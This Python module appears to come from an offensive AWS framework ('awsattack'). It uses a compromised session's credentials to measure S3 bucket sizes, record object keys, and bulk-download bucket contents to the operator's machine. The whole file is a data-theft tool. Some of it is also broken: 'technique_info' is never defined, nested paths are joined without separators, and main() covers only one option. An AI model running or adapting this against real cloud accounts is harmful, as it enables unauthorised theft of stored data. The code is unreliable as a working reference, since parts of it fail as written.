#!/usr/bin/env python3
import datetime

import argparse
import datetime
from copy import deepcopy
import os

from botocore.exceptions import ClientError

FILE_SIZE_THRESHOLD = 1073741824

def get_bucket_size(awsattack, bucket_name):
    client = awsattack.get_boto3_client('cloudwatch', 'us-east-1')
    response = client.get_metric_statistics(
        Namespace='AWS/S3',
        MetricName='BucketSizeBytes',
        Dimensions=[
            {'Name': 'BucketName', 'Value': bucket_name},
            {'Name': 'StorageType', 'Value': 'StandardStorage'}
        ],
        Statistics=['Average'],
        Period=3600,
        StartTime=datetime.datetime.today() - datetime.timedelta(days=1),
        EndTime=datetime.datetime.now().isoformat()
    )
    if response['Datapoints']:
        return response['Datapoints'][0]['Average']
    return 0


def download_s3_file(awsattack, key, bucket):
    session = awsattack.get_active_session()
    base_directory = 'sessions/{}/downloads/{}/{}/'.format(session.name, technique_info['name'], bucket)

    directory = base_directory
    offset_directory = key.split('/')[:-1]
    if offset_directory:
        directory += '/' + ''.join(offset_directory)
    if not os.path.exists(directory):
        os.makedirs(directory)

    s3 = awsattack.get_boto3_resource('s3')

    size = s3.Object(bucket, key).content_length
    if size > FILE_SIZE_THRESHOLD:
        awsattack.print('  LARGE FILE DETECTED:')
        confirm = awsattack.input('    Download {}? Size: {} bytes (y/n) '.format(key, size))
        if confirm != 'y':
            return False
    try:
        s3.Bucket(bucket).download_file(key, base_directory + key)
    except Exception as error:
        awsattack.print('  {}'.format(error))
        return False
    return True


def extract_from_file(awsattack, file):
    files = {}
    try:
        with open(file, 'r') as bucket_file:
            for line in bucket_file:
                delimiter = line.rfind('@')
                key = line[:delimiter]
                bucket = line[delimiter + 1:-1]
                files[key] = bucket
    except FileNotFoundError:
        awsattack.print('  Download File not found...')
    return files


def write_bucket_keys_to_file(awsattack, objects):
    awsattack.print('  Writing file names to disk...')
    session = awsattack.get_active_session()
    file = 'sessions/{}/downloads/{}/'.format(session.name, 's3_download_bucket')
    if not os.path.exists(file):
        os.makedirs(file)
    file += '{}_file_names.txt'.format('s3_download_bucket')
    try:
        with open(file, 'w') as objects_file:
            for key in objects:
                for file in objects[key]:
                    objects_file.write('{}@{}\n'.format(file, key))
    except Exception as error:
        print(error)
    return True


def main(args, awsattack_main):
    session = awsattack_main.get_active_session()
    
    print = awsattack_main.print

    # Download Objects from File
    if args.dl_names:
        awsattack_main.print('  Extracting files from file...')
        extracted_files = extract_from_file(awsattack_main, args.dl_names)
        total = len(extracted_files.keys())
        success = 0
        for key in extracted_files:
            if download_s3_file(awsattack_main, key, extracted_files[key]):
                success += 1
        awsattack_main.print('  Finished downloading from file...')
        return {'downloaded_files': success, 'failed': total - success}

